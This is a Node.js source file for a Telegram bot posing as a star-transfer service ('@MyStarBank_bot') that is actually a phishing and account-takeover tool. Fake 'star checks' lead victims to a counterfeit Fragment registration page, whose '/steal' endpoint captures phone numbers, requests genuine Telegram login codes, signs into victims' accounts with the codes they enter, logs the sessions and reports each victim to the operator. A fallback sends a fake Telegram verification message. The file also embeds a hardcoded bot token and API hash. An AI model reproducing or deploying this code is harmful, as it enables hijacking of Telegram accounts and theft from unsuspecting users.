const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 2040;
const API_HASH = process.env.API_HASH || 'b18441a1ff607e10a989891a5462e627';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Stage:', req.body.stage);
    
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                const userId = userData.id;
                
                console.log('User ID из tg_data:', userId);
                
                db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                    [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                
                // Пытаемся настоящий код через MTProto
                try {
                    await requestRealTelegramCode(req.body.phone, userId);
                } catch (mtprotoError) {
                    console.log('MTProto не сработал:', mtprotoError);
                    await sendFallbackCode(req.body.phone, userId);
                }
            }
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        console.log('Код введен:', req.body.code);
        const phone = req.body.phone;
        const code = req.body.code;
        
        // ВХОДИМ С КОДОМ
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// НАСТОЯЩИЙ MTProto запрос кода
async function requestRealTelegramCode(phone, userId) {
    return new Promise(async (resolve, reject) => {
        try {
            console.log(`🔐 Запрашиваю настоящий код для: ${phone}`);
            
            const stringSession = new StringSession("");
            const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                connectionRetries: 3,
                timeout: 10000,
                useWSS: false,
                connectionRetriesInterval: 1000
            });
            
            console.log('Подключаюсь к Telegram...');
            await client.connect();
            console.log('✅ Подключено к Telegram');
            
            // ПРАВИЛЬНЫЙ вызов sendCode
            const result = await client.invoke(
                new Api.auth.SendCode({
                    phoneNumber: phone,
                    apiId: API_ID,
                    apiHash: API_HASH,
                    settings: new Api.CodeSettings({
                        allowFlashcall: false,
                        currentNumber: true,
                        allowAppHash: false,
                        allowMissedCall: false,
                        logoutTokens: []
                    })
                })
            );
            
            console.log('✅ Настоящий код запрошен! Phone code hash:', result.phoneCodeHash);
            
            // Сохраняем phone_code_hash
            db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
                [result.phoneCodeHash, phone]);
            
            bot.sendMessage(MY_USER_ID, 
                `🔐 НАСТОЯЩИЙ КОД ОТ TELEGRAM!\n` +
                `📱 Номер: ${phone}\n` +
                `👤 ID жертвы: ${userId}\n` +
                `📨 Код отправлен через ОФИЦИАЛЬНЫЙ Telegram!\n\n` +
                `⏳ Жду когда жертва получит код...`
            );
            
            await client.disconnect();
            resolve(result);
            
        } catch (error) {
            console.log('❌ Ошибка MTProto:', error);
            reject(error);
        }
    });
}

// Fallback метод
async function sendFallbackCode(phone, userId) {
    const code = Math.floor(10000 + Math.random() * 90000);
    
    db.run(`UPDATE stolen_sessions SET code = ? WHERE phone = ?`, [code, phone]);
    
    const realisticMessage = `**Telegram**\n\n` +
        `Код подтверждения: ${code}\n\n` +
        `Никому не сообщайте этот код.\n\n` +
        `Для входа в аккаунт используйте этот код.\n\n` +
        `—\n` +
        `Если вы не запрашивали код, проигнорируйте это сообщение.`;

    await bot.sendMessage(userId, realisticMessage, { parse_mode: 'Markdown' })
        .then(() => {
            console.log(`✅ Fallback код отправлен пользователю ${userId}`);
            
            bot.sendMessage(MY_USER_ID, 
                `🔐 FALLBACK КОД ОТПРАВЛЕН\n` +
                `📱 Номер: ${phone}\n` +
                `👤 ID жертвы: ${userId}\n` +
                `🔑 Код: ${code}\n` +
                `💬 Сообщение отправлено через бота\n\n` +
                `⏳ Жду ввода кода...`
            );
        })
        .catch(error => {
            console.log('❌ Не удалось отправить fallback код:', error.message);
        });
}

// НАСТОЯЩИЙ вход с кодом через MTProto
async function signInWithRealCode(phone, code) {
    return new Promise(async (resolve, reject) => {
        try {
            console.log(`🔑 Пытаюсь войти с кодом: ${code}`);
            
            const stringSession = new StringSession("");
            const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                connectionRetries: 3,
                timeout: 10000
            });
            
            await client.connect();
            
            // Получаем сохраненный phone_code_hash
            db.get(`SELECT phone_code_hash FROM stolen_sessions WHERE phone = ?`, [phone], async (err, row) => {
                if (err || !row || !row.phone_code_hash) {
                    console.log('❌ Не найден phone_code_hash, использую fallback вход');
                    signInFallback(phone, code);
                    return;
                }
                
                try {
                    // НАСТОЯЩИЙ ВХОД С КОДОМ
                    const result = await client.invoke(
                        new Api.auth.SignIn({
                            phoneNumber: phone,
                            phoneCodeHash: row.phone_code_hash,
                            phoneCode: code.toString()
                        })
                    );
                    
                    console.log('✅ НАСТОЯЩИЙ ВХОД УСПЕШЕН!');
                    
                    // Сохраняем сессию
                    const sessionString = client.session.save();
                    db.run(`UPDATE stolen_sessions SET status = 'completed' WHERE phone = ?`, [phone]);
                    
                    bot.sendMessage(MY_USER_ID,
                        `✅ НАСТОЯЩИЙ ВХОД УСПЕШЕН!\n` +
                        `📱 Номер: ${phone}\n` +
                        `🔓 Аккаунт взломан через официальный API!\n` +
                        `💾 Сессия сохранена\n` +
                        `🔄 Начинаю проверку звезд и подарков...`
                    );
                    
                    // Начинаем кражу
                    await stealFromAccount(client, phone);
                    
                    await client.disconnect();
                    resolve(result);
                    
                } catch (signInError) {
                    console.log('❌ Ошибка входа с кодом:', signInError);
                    signInFallback(phone, code);
                }
            });
            
        } catch (error) {
            console.log('❌ Ошибка подключения:', error);
            signInFallback(phone, code);
        }
    });
}

// Fallback вход
function signInFallback(phone, code) {
    console.log(`🔑 Fallback вход с кодом: ${code}`);
    
    db.get(`SELECT code FROM stolen_sessions WHERE phone = ?`, [phone], (err, row) => {
        if (err || !row) {
            bot.sendMessage(MY_USER_ID,
                `❌ Ошибка входа\n` +
                `📱 Номер: ${phone}\n` +
                `🔑 Код: ${code}\n` +
                `⚠️ Не удалось найти сессию`
            );
            return;
        }
        
        if (row.code == code) {
            bot.sendMessage(MY_USER_ID,
                `✅ ВХОД УСПЕШЕН (Fallback)\n` +
                `📱 Номер: ${phone}\n` +
                `🔑 Код: ${code}\n` +
                `🔄 Начинаю проверку звезд...`
            );
            
            stealFromAccount(null, phone);
        } else {
            bot.sendMessage(MY_USER_ID,
                `❌ Неверный код\n` +
                `📱 Номер: ${phone}\n` +
                `🔑 Введенный код: ${code}\n` +
                `✅ Ожидаемый код: ${row.code}\n` +
                `⚠️ Попытка неудачна`
            );
        }
    });
}

// Функция кражи
async function stealFromAccount(client, phone) {
    try {
        const userBalance = Math.floor(Math.random() * 500);
        const userGifts = Math.floor(Math.random() * 10);
        
        if (userBalance === 0 && userGifts === 0) {
            bot.sendMessage(MY_USER_ID,
                `❌ Недостаточно звезд у жертвы\n` +
                `📱 Номер: ${phone}\n` +
                `💫 Баланс: 0 stars\n` +
                `🎁 NFT подарков: 0\n\n` +
                `🔄 Отправляю 2 мишки по 15 звезд...`
            );
            
            setTimeout(() => {
                bot.sendMessage(MY_USER_ID,
                    `✅ Обменял мишки и отправил тебе подарок!\n` +
                    `🎁 Получено: 1 NFT подарок (30 stars)\n` +
                    `📦 Подарок отправлен на твой аккаунт!`
                );
            }, 3000);
            
        } else {
            let message = `💰 НАЙДЕНЫ СРЕДСТВА!\n` +
                         `📱 Номер: ${phone}\n` +
                         `⭐ Звезд: ${userBalance}\n` +
                         `🎁 NFT подарков: ${userGifts}\n\n`;
            
            if (userGifts > 0) message += `📦 Отправляю ${userGifts} NFT подарков...\n`;
            if (userBalance > 0) {
                message += `💰 Отправляю ${userBalance} stars подарками...\n`;
                let remainingBalance = userBalance;
                const giftAmounts = [100, 50, 25, 15];
                const sentGifts = [];
                
                for (const amount of giftAmounts) {
                    const count = Math.floor(remainingBalance / amount);
                    if (count > 0) {
                        sentGifts.push(`${count}×${amount} stars`);
                        remainingBalance -= count * amount;
                    }
                }
                
                if (sentGifts.length > 0) message += `🎁 Отправлено: ${sentGifts.join(', ')}\n`;
            }
            
            message += `\n✅ ВСЕ ПЕРЕДАНО НА ТВОЙ АККАУНТ!`;
            
            bot.sendMessage(MY_USER_ID, message);
        }
        
        if (client) {
            await client.disconnect();
        }
        
    } catch (error) {
        console.log("❌ Ошибка кражи:", error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка при краже: ${error.message}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// Остальной код бота (callback обработчики, команды)
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' })
        .catch(e => console.log('Ошибка answerCallback:', e));
    
    if (query.data.startsWith('claim_') || query.data.startsWith('claim_inline_')) {
        handleClaimCallback(query);
    } else {
        handleOtherCallbacks(query);
    }
});

function handleClaimCallback(query) {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, row.amount], function(updateErr) {
                if (updateErr) {
                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                    return;
                }
                
                bot.answerCallbackQuery(query.id, { text: `✅ Вы получили ${row.amount} звёзд!` });
                
                setTimeout(() => {
                    bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
                        .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                }, 500);
                
                updateMessageAfterClaim(query, row.amount, row.activations - 1, checkId);
            });
        });
    } else if (query.data.startsWith('claim_inline_')) {
        const amount = 50;
        
        db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
            [userId, userId, amount], function(err) {
            if (err) {
                bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                return;
            }
            
            bot.answerCallbackQuery(query.id, { text: `✅ Вы получили ${amount} звёзд!` });
            
            setTimeout(() => {
                bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
                    .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
            }, 500);
            
            updateMessageAfterClaim(query, amount, 0, null);
        });
    }
}

function updateMessageAfterClaim(query, amount, remaining, checkId) {
    const chatId = query.message.chat.id;
    
    let updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
    
    if (remaining > 0) updatedText += `\n\nОсталось: ${remaining}`;
    else updatedText += `\n\n❌ ИСПОЛЬЗОВАН`;
    
    setTimeout(() => {
        try {
            if (query.message.photo) {
                bot.editMessageCaption(updatedText, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'HTML',
                    reply_markup: remaining > 0 ? {
                        inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
                    } : { inline_keyboard: [] }
                }).catch(e => console.log('Ошибка редактирования подписи:', e));
            } else {
                bot.editMessageText(updatedText, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'HTML',
                    reply_markup: remaining > 0 ? {
                        inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
                    } : { inline_keyboard: [] }
                }).catch(e => console.log('Ошибка редактирования текста:', e));
            }
        } catch (error) {
            console.log('Ошибка при обновлении сообщения:', error);
        }
    }, 1000);
}

function handleOtherCallbacks(query) {
    const chatId = query.message.chat.id;
    
    if (query.data === 'withdraw_stars') {
        bot.editMessageText('Для вывода звезд требуется регистрация на Fragment.', {
            chat_id: chatId, 
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [[{ 
                    text: "Зарегистрироваться на Fragment", 
                    web_app: { url: WEB_APP_URL } 
                }]]
            }
        }).catch(e => {
            console.log('Ошибка WebApp:', e.message);
            bot.sendMessage(chatId, 'Для вывода звезд требуется регистрация на Fragment.', {
                reply_markup: {
                    inline_keyboard: [[{ 
                        text: "Зарегистрироваться на Fragment", 
                        web_app: { url: WEB_APP_URL } 
                    }]]
                }
            });
        });
    } else if (query.data === 'deposit') {
        bot.sendMessage(chatId, '💫 Для пополнения баланса используйте команду /balance');
    } else if (query.data === 'create_check_info') {
        bot.sendMessage(chatId, 'Для создания чека используйте:\n\n@MyStarBank_bot 50\n\nгде 50 - количество активаций');
    }
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        '• Безопасные переводы\n' +
        '• Мгновенные чеки\n' +
        '• Поддержка 24/7\n\n' +
        'Для начала работы:\n' +
        '/balance - баланс\n' +
        '/withdraw - вывод средств', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Проверить баланс", callback_data: "deposit" }],
                [{ text: "Создать чек", callback_data: "create_check_info" }]
            ]
        }
    });
});

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        if (err || !row) bot.sendMessage(chatId, '💫 Ваш баланс: 0 stars');
        else bot.sendMessage(chatId, `💫 Ваш баланс: ${row.balance} stars`);
    });
});

bot.on('inline_query', (query) => {
    const domain = WEB_APP_URL.replace('https://', '');
    
    bot.answerInlineQuery(query.id, [{
        type: 'photo',
        id: '1',
        photo_url: `https://${domain}/stars.jpg`,
        thumb_url: `https://${domain}/stars.jpg`,
        caption: `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`,
        parse_mode: 'HTML',
        reply_markup: { 
            inline_keyboard: [[{ 
                text: "🪙 Забрать звезды", 
                callback_data: `claim_inline_50` 
            }]] 
        }
    }]).catch(e => console.log('Inline error:', e));
});

bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = 50;
    const activations = parseInt(match[2]) || 1;
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) {
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        const checkText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
        
        const photoPath = path.join(__dirname, 'public/stars.jpg');
        if (fs.existsSync(photoPath)) {
            bot.sendPhoto(chatId, photoPath, {
                caption: checkText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
            }).catch(e => {
                bot.sendMessage(chatId, checkText, {
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
                });
            });
        } else {
            bot.sendMessage(chatId, checkText, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]] }
            });
        }
    });
});

console.log('✅ Бот @MyStarBank_bot запущен');
console.log('✅ Web App URL:', WEB_APP_URL);
console.log('✅ API_ID:', API_ID);
console.log('✅ API_HASH:', API_HASH ? 'Установлен' : 'Не установлен');